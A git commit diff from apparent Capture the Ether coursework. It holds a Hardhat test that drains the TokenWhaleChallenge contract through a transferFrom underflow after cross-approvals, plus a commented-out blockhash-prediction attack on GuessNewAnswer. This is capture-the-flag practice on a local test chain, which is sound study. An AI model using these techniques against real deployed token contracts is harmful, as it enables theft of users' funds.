db7d4fdb384eb113298a314ceed0be1e0a1a2e6c
Elizaveta Olenberg <eolenberg@drew.edu>
2023-04-27 10:47:38 -0400

    capture the ether

--- week6/contracts/lotteries/GuessNewAnswer.sol
+++ week6/contracts/lotteries/GuessNewAnswer.sol
@@ -11,10 +11,10 @@ contract GuessNewAnswer{
 
     function solve() public payable {
         // (msg.sender).transfer(1 ether);
-        uint8 answer = uint8(keccak256(abi.encodePacked(block.blockhash(block.number - 1), block.timestamp)));
+        // uint8 answer = uint8(keccak256(abi.encodePacked(block.blockhash(block.number - 1), block.timestamp)));
         // (msg.sender).transfer(address(this).balance);
         // challenge.guess(answer);
-        challenge.guess{value: 1 ether}(answer);
+        // challenge.guess{value: 1 ether}(answer);
         // challenge.guess{value: 1 ether}(answer);
         // challenge.guess(answer, {value: 1 ether});
     }
--- week6/test/tokenWhaleTest.js
+++ week6/test/tokenWhaleTest.js
@@ -1,28 +1,46 @@
 const { expect } = require("chai");
 const { assert } = require("console");
-const { ethers } = require("hardhat");
-// require("@nomicfoundation/hardhat-chai-matchers");
-
+const { ethers, hardhatArguments } = require("hardhat");
 
 let accounts;
 let acc;
+let acc1;
 let game;
 
 before(async () => {
   accounts = await ethers.getSigners();
   acc = accounts[0];
+  acc1 = accounts[1]
   game = await ethers.getContractFactory("TokenWhaleChallenge")
-      .then((factory) => factory.deploy());
+      .then((factory) => factory.deploy(acc.address));
 
 });
 
-it("guess New", async function () {
+it("solves token whale", async function () {
   console.log("whale:", game.address)
   
-  const balance = await ethers.provider.getBalance(game.address);
-  // const isComplete = await contract.isComplete()
-  // expect(isComplete).to.be.true;
-  console.log("bal: ", balance)
+  // const balance = await ethers.provider.getBalance(acc);
+  // const tokBal = await game.balanceOf(acc)
+
+  const tx = await game.transfer(acc1.address, 501)
+  await tx.wait()
+  console.log("before")
+  console.log("bal acc: ", await game.balanceOf(acc.address))
+  console.log("bal acc1: ", await game.balanceOf(acc1.address))
+
+  const appr = await game.connect(acc1).approve(acc.address, 1000)
+  await appr.wait()
+
+  const appr1 = await game.connect(acc).approve(acc1.address, 1000)
+  await appr1.wait()
+
+  const tx1 = await game.transferFrom(acc1.address, acc1.address, 500)
+  await tx1.wait()
+  const isComplete = await game.isComplete()
+  expect(isComplete).to.be.true;
+  console.log("after")
+  console.log("bal acc: ", await game.balanceOf(acc.address))
+  console.log("bal acc1: ", await game.balanceOf(acc1.address))
 });
 
  
